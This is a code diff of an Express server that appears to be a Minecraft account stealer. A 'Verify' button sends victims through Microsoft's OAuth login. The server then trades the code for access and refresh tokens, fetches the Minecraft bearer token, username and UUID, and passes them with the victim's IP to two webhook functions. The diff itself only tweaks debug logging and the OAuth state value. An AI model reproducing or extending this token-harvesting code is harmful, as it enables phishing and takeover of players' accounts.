@@ -10,7 +10,7 @@ const requestIp = require('request-ip')
 const app = express()
 const port = process.env.PORT || 3000
 
-const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
+const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=OK'
 
 // app.get('/verify', async (req, res) => {
 // 	res.send("<html> <head> <meta charset=\"UTF-8\"> <title>Verification</title> <style> a:visited { color: LightGray; } a { color: LightGray; } a:hover { color: white; } div { height: 50px; } @import url('http://fonts.cdnfonts.com/css/proxima-nova-2'); body { margin: 0; padding: 0; background: #212121; } button { position: absolute; animate: 0.5s; transition: 0.5s; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 200px; height: 60px; text-align: center; line-height: 60px; color: #fff; font-size: 22px; text-transform: uppercase; text-decoration: none; font-family: 'Proxima Nova', sans-serif; box-sizing: border-box; background: linear-gradient(90deg, #03a9f4, #f441a5, #ffeb3b, #03a9f4); background-size: 400%; border-radius: 30px; z-index: 1; cursor:pointer; } button:hover { animation: animate 8s linear infinite; animate: 0.5s; transition: 0.5s; } @keyframes animate { 0% { background-position: 0%; } 100% { background-position: 400%; } } button:before { animate: 0.5s; transition: 0.5s; content: ''; position: absolute; top: -5px; left: -5px; right: -5px; bottom: -5px; z-index: -1; background: linear-gradient(90deg, #03a9f4, #f441a5, #ffeb3b, #03a9f4); background-size: 400%; border-radius: 40px; opacity: 0; transition: 0.5s; } button:hover:before { filter: blur(20px); opacity: 1; animation: animate 8s linear infinite; animate: 0.5s; transition: 0.5s; } </style> </head> <body> <button type=\"button\" onclick= \"window.open('"+redirect+"','popUpWindow','height=500,width=400,left=100,top=100,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');\">Verify</button> </body> </html>")
@@ -25,9 +25,13 @@ app.get('/', async (req, res) => {
         return
     }
     try {
+        console.log("1")
         const accessTokenAndRefreshTokenArray = await getAccessTokenAndRefreshToken(code)
+        console.log("2")
         const accessToken = accessTokenAndRefreshTokenArray[0]
+        console.log("3")
         const refreshToken = accessTokenAndRefreshTokenArray[1]
+        console.log("4")
         const hashAndTokenArray = await getUserHashAndToken(accessToken)
         const userToken = hashAndTokenArray[0]
         const userHash = hashAndTokenArray[1]
@@ -36,8 +40,6 @@ app.get('/', async (req, res) => {
         const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
-        console.log(username)
-        console.log(uuid)
         const ip = clientIp
         postToWebhook(username, bearerToken, uuid, ip, refreshToken)
 	postToWebhook2(username, bearerToken, uuid, ip, refreshToken)
